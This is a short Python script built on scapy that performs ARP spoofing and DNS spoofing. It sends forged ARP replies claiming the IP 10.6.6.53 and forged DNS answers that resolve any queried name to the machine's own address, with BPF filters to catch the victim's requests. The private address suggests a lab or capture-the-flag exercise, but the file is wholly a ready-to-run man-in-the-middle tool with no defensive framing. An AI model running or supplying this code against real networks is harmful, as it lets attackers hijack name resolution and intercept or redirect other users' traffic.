#!/usr/bin/python3

from scapy.all import *
import netifaces as ni
import uuid

# Our eth0 ip
ETH0_IP = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']

# Our eth0 mac address
MAC = ':'.join(['{:02x}'.format((uuid.getnode() >> i) & 0xff) for i in range(0,8*6,8)][::-1])

# destination ip we arp spoofed
SPOOFED_IP = "10.6.6.53"

def handle_arp_packet(packet):
    # packet.show()
    # if arp request, then we need to fill this out to send back our mac as the response
    if ARP in packet and packet[ARP].op == 1:
        eth = Ether(dst=packet[Ether].src, type=0x806, src=MAC)
        arp = ARP()
        arp.op = 0x2 # reply
        arp.plen = 0x4
        arp.hwlen = 0x6
        arp.ptype = 0x800 # IPv4
        arp.hwtype = 0x1 # ethernet
        arp.hwsrc = MAC
        arp.psrc = SPOOFED_IP
        arp.hwdst = packet[Ether].src
        arp.pdst = packet[ARP].psrc
        response = eth / arp
        # response.show()
        sendp(response, iface="eth0")

def handle_dns_packet(packet):
    eth = Ether(src=MAC, dst=packet[Ether].src)
    ip  = IP(dst=packet[IP].src, src=SPOOFED_IP)
    udp = UDP(dport=packet[UDP].sport, sport=packet[UDP].dport)
    dns = DNS(
        # [DNS].qd.qname vs [DNSQR].qname?
        an=DNSRR(rrname=packet[DNS].qd.qname, rdata=ETH0_IP),
        ancount=1, aa=1, qr=1,
        id=packet[DNS].id,
        rd=packet[DNS].rd,
        qdcount=packet[DNS].qdcount,
        qd=packet[DNS].qd,
    )
    dns_response = eth / ip / udp / dns
    sendp(dns_response, iface="eth0")

def dispatcher(packet):
    if ARP in packet:
        handle_arp_packet(packet)
    elif DNS in packet:
        handle_dns_packet(packet)
    else:
        print("huh, got a filtered packet that is neither ARP nor DNS")

def main():
    # BPF filters
    arp_bpf = "(arp[6:2] = 1)"

    dns_bpf = " and ".join( [
        "udp dst port 53",                   # dns
        "udp[10] & 0x80 = 0",                # dns request
        "dst host {}".format(SPOOFED_IP),    # destination ip we had spoofed (not our real ip)
        "ether dst host {}".format(MAC)      # our macaddress since we spoofed the ip to our mac
    ] )

    # sniffing for $count packet(s) that will be sent to a function, while storing none
    sniff(filter=f"{arp_bpf} or ({dns_bpf})", prn=dispatcher, store=0, count=2)

if __name__ == "__main__":
    main()
